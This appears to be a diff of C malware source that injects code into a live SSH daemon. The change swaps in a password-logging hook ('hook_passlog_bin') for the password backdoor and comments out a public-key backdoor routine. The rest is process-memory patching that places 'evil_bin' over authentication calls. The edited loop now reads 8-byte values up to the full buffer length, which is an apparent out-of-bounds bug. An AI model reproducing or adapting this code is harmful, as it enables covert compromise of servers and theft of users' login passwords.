@@ -15,8 +15,8 @@
 #include <util.h>
 #include <elflib.h>
 
-extern u8 *evil_hook;
-extern u64 evil_hook_size;
+extern unsigned char hook_passlog_bin[];
+extern int hook_passlog_bin_len;
 
 u8 *dynsym, *dynstr;
 u64 dynsym_base, dynstr_base;
@@ -71,6 +71,7 @@ u64 find_hole(inject_ctx *ctx, u64 call, u32 size) {
 	return hole_addr;
 }
 
+/*
 void pubkey_backdoor(inject_ctx *ctx, char *pubkey) {
 	signature signatures[]={
 		{ 0x7777777788888888, "key_allowed", "trying public key file %s", 0 },
@@ -168,6 +169,7 @@ void pubkey_backdoor(inject_ctx *ctx, char *pubkey) {
 	info("poked evil_bin to 0x%lx.", hole_addr);
 	
 }
+*/
 
 void password_backdoor(inject_ctx *ctx) {
 	u8 privsep_jnz[2]={0,0};
@@ -179,9 +181,9 @@ void password_backdoor(inject_ctx *ctx) {
 	u64 diff=0, hole_addr=0;
 	u8 *evil_bin;
 	u32 use_privsep_val=0;
-	
-	evil_bin = malloc(evil_hook_size);
-	memcpy(evil_bin, evil_hook, evil_hook_size);
+
+	evil_bin = malloc(hook_passlog_bin_len);
+	memcpy(evil_bin, hook_passlog_bin, hook_passlog_bin_len);
 
 	use_privsep = resolve_symbol_tab(ctx, "use_privsep");
 
@@ -297,7 +299,7 @@ void password_backdoor(inject_ctx *ctx) {
 	}
 	
 	// Insert return address
-	for(j = 0; j < evil_hook_size - 8; j++) {
+	for(j = 0; j < hook_passlog_bin_len; j++) {
 		u64 *vptr = (u64*)&evil_bin[j];
 		switch (*vptr) {
 			case 0x1111111122222222:
@@ -312,7 +314,7 @@ void password_backdoor(inject_ctx *ctx) {
 		}
 	}
 
-	_poke(ctx->pid, hole_addr, evil_bin, evil_hook_size);
+	_poke(ctx->pid, hole_addr, evil_bin, hook_passlog_bin_len);
 	info("poked evil_bin to 0x%lx.", hole_addr);
 	
 	free(mm_auth_password_calls);
